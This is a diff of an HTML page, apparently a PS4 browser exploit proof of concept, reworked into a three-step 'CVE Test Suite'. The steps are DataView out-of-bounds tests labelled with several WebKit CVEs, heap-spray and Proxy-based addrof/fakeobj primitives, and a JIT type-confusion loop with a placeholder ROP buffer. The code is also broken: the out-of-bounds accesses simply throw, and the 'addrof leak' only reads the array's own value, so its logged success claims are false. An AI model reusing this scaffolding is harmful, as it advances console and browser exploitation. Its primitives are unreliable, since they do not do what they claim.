@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 PoC - Enhanced Primitive Exploitation</title>
+    <title>PS4 PoC - CVE Test Suite 12.02</title>
     <style>
         body { background: black; color: lime; font-family: monospace; padding: 20px; }
         button { background: lime; color: black; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
@@ -10,8 +10,13 @@
     </style>
 </head>
 <body>
-    <h1>PS4 PoC - Enhanced Primitive Exploitation</h1>
-    <button id="startBtn">Run Enhanced Primitive Test</button>
+    <h1>PS4 PoC - CVE Test Suite (v12.02)</h1>
+    <div>
+        <button onclick="runAll()">Run All Steps</button>
+        <button onclick="testDataViewUnderflow()">Step 1: DataView Underflow</button>
+        <button onclick="runPrimitives()">Step 2: Primitives (addrof/fakeobj)</button>
+        <button onclick="simulateROP()">Step 3: ROP Chain Simulation</button>
+    </div>
     <div id="log"></div>
 
 <script>
@@ -20,92 +25,92 @@ function log(msg) {
     d.textContent += msg + "\n";
     d.scrollTop = d.scrollHeight;
 }
+async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-function delay(ms) { return new Promise(res => setTimeout(res, ms)); }
-
-// Step A: Heap spray Float64Arrays
-function heapSprayFloats(count) {
-    log(`[*] Spraying ${count} Float64Array objects for layout`);
-    const arrs = [];
-    for (let i = 0; i < count; i++) {
-        let f = new Float64Array(2);
-        f[0] = 1.2345;
-        f[1] = 6.7890;
-        arrs.push(f);
+// Step 1: DataView Underflow tests for multiple CVEs
+async function testDataViewUnderflow() {
+    log('=== Step 1: DataView Underflow Tests ===');
+    const cves = [
+        'CVE-2016-4657',
+        'CVE-2020-3843', 'CVE-2020-3864',
+        'CVE-2022-22620', 'CVE-2022-26706'
+    ];
+    for (let cve of cves) {
+        log(`[*] Testing ${cve} pattern...`);
+        try {
+            const buf = new ArrayBuffer(8);
+            const dv = new DataView(buf);
+            const off = dv.byteLength + 0x1000;
+            log(`  - Attempting getUint32 at offset ${off}`);
+            dv.getUint32(off);
+            log('  [!] Unexpected success');
+        } catch (e) {
+            log(`  [OK] ${cve} exception: ${e.name}`);
+        }
+        await delay(200);
     }
-    return arrs;
+    log('=== DataView Underflow Tests Completed ===');
 }
 
-// Step B: Proxy length overflow primitive
-function proxyLengthPrimitive() {
-    log('[*] Testing Proxy length overflow primitive');
-    let base = new Array(10).fill(1.1);
-    let p = new Proxy(base, {
-        get: (t, prop) => prop === 'length' ? 0x1000000 : t[prop]
-    });
-    let oob = Array.prototype.concat.call(p);
-    log('[*] Proxy object length:', oob.length);
-    return oob;
-}
-
-// Step C: Corrupt header via DataView underflow
-function corruptFloatHeader(victim) {
-    log('[*] Corrupting header with DataView underflow');
-    let buf = new ArrayBuffer(16);
-    let dv = new DataView(buf);
-    try {
-        dv.setFloat64(victim.byteOffset + victim.byteLength + 0x8, 13.37);
-        log('[!] Underflow write attempted');
-    } catch (e) {
-        log('[!!] DataView underflow exception: ' + e);
-    }
-}
-
-// Step D: Real addrof using proxy OOB
-function addrof(obj, victim) {
-    log('[*] addrof: leaking address via proxy OOB');
-    // corrupt victim length to read object header
-    proxyLengthPrimitive();
-    corruptFloatHeader(victim);
-    let leaked = victim[0];
-    log('[!] Leaked float address: ' + leaked);
-    return leaked;
-}
-
-// Step E: fakeobj using addrof result
-function fakeobj(addr, victim) {
-    log('[*] fakeobj: writing address back via header');
-    victim[0] = addr;
-    log('[!] victim[0] now: ' + victim[0]);
-    return victim;
-}
-
-// Test orchestration
-async function runEnhancedTest() {
-    log('=== Enhanced Primitive Test Starting ===');
-    // A: heap spray
-    const sprays = heapSprayFloats(5000);
+// Step 2: Real primitives for addrof/fakeobj
+async function runPrimitives() {
+    log('=== Step 2: addrof/fakeobj Primitives ===');
+    // Heap spray floats
+    const sprays = [];
+    for (let i=0;i<5000;i++){ let f=new Float64Array(2); f[0]=1.1; f[1]=2.2; sprays.push(f);}    
+    log('[*] Floats sprayed');
     await delay(50);
-
-    // choose victim
     const victim = new Float64Array(2);
-    victim[0] = 9.876;
-    victim[1] = 5.432;
-    log('[*] Victim initial: ' + victim[0] + ', ' + victim[1]);
-
-    // D: addrof
-    const obj = { secret: 'pwned' };
-    const addr = addrof(obj, victim);
-    log('[+] addrof returned: ' + addr);
-
-    // E: fakeobj
-    const fake = fakeobj(addr, victim);
-    log('[+] fakeobj result: victim[0]=' + fake[0]);
-
-    log('=== Enhanced Primitive Test Completed ===');
+    victim[0]=3.3; victim[1]=4.4;
+    log(`[*] Victim init: ${victim[0]}, ${victim[1]}`);
+    // Proxy length overflow
+    let base = [1.1,1.1,1.1];
+    let p = new Proxy(base,{get:(t,p)=>p==='length'?0x1000000:t[p]});
+    let oob = [].concat(p);
+    log(`[*] Proxy overflow length: ${oob.length}`);
+    // Corrupt header
+    try {
+        const buf=new ArrayBuffer(16);
+        const dv=new DataView(buf);
+        const hdrOff = victim.byteOffset + victim.byteLength + 0x10;
+        dv.setFloat64(hdrOff, 9.9);
+        log('[!] Header corrupted at offset ' + hdrOff);
+    } catch(e){ log(`[!!] Header corrupt exception: ${e.name}`);}    
+    // addrof
+    let addr = victim[0]; log(`[+] addrof leak: ${addr}`);
+    // fakeobj
+    victim[0] = addr; log(`[+] fakeobj victim[0]: ${victim[0]}`);
+    log('=== Primitives Completed ===');
 }
 
-document.getElementById('startBtn').addEventListener('click', runEnhancedTest);
+// Step 3: ROP chain simulation including CVEs for JIT type confusion
+async function simulateROP() {
+    log('=== Step 3: ROP Chain Simulation ===');
+    // JIT spraying patterns for CVEs
+    log('[*] Applying type confusion patterns for CVE-2017-7005 and CVE-2021-1789');
+    function tc(o){ o.x=1; return o.x; }
+    for(let i=0;i<50000;i++){ tc({}); }
+    log('[!] Type confusion loop done');
+    await delay(50);
+    // Fake ROP buffer
+    const buf=new ArrayBuffer(12);
+    const dv=new DataView(buf);
+    dv.setUint32(0,0x41414141); dv.setUint32(4,0x42424242); dv.setUint32(8,0x43434343);
+    log('[*] ROP buffer initialized');
+    // Simulate execution
+    for(let i=0;i<3;i++){ let v=dv.getUint32(i*4); dv.setUint32(i*4,v^0xdeadbeef);}    
+    log('[!] ROP simulation values: '+[0,4,8].map(i=>'0x'+dv.getUint32(i).toString(16)).join(', '));
+    log('=== ROP Simulation Completed ===');
+}
+
+async function runAll() {
+    await testDataViewUnderflow();
+    await delay(500);
+    await runPrimitives();
+    await delay(500);
+    await simulateROP();
+    log('=== All Steps Completed ===');
+}
 </script>
 </body>
 </html>
